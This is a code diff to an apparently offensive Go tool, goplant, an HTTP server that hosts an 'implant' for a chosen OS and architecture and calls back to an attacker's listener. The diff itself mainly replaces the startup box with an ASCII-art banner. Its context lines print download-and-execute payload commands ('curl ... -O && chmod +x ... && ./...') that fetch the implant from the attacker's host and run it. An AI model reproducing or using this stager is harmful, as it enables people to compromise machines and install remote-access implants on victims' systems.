@@ -19,6 +19,12 @@ var plants = []string{
 	"Orchid", "Daisy", "Fern", "Bonsai", "Poinsettia",
 }
 
+var Banner = "   ______      ____  __            __ \n" +
+	"  / ____/___  / __ \\/ /___ _____  / /_\n" +
+	" / / __/ __ \\/ /_/ / / __ `/ __ \\/ __/\n" +
+	"/ /_/ / /_/ / ____/ / /_/ / / / / /_  \n" +
+	"\\____/\\____/_/   /_/\\__,_/_/ /_/\\__/\n"
+
 // Server représente le serveur HTTP de goplant
 type Server struct {
 	lhost      string
@@ -57,13 +63,11 @@ func (s *Server) Start() error {
 	s.httpServer = &http.Server{Addr: addr, Handler: mux}
 
 	// Afficher les informations du serveur
-	fmt.Println("╔════════════════════════════════════════════════════════════╗")
-	fmt.Println("║          🪴 Goplant Server started 🪴                       ║")
-	fmt.Println("╚════════════════════════════════════════════════════════════╝")
+	fmt.Println(Banner)
 	fmt.Printf("🪴Listen on:   http://%s%s\n", addr, s.plantPath)
 	fmt.Printf("\n🪴 Implant : %s/%s --> %s:%s\n", s.targetOS, s.arch, s.lhost, s.lport)
-	// fmt.Printf("   - Listener: %s:%s\n", s.lhost, s.lport)
-	// fmt.Printf("   - Platform: %s/%s\n", s.targetOS, s.arch)
+	// fmt.Printf("   - Listener: %s:%s\\n", s.lhost, s.lport)
+	// fmt.Printf("   - Platform: %s/%s\\n", s.targetOS, s.arch)
 	fmt.Printf("\n\n🪴 Payloads : \n")
 	fmt.Printf("curl http://%s:%s%s -O\n", s.lhost, s.bindPort, s.plantPath)
 	fmt.Printf("curl http://%s:%s%s -O && chmod +x %s && ./%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
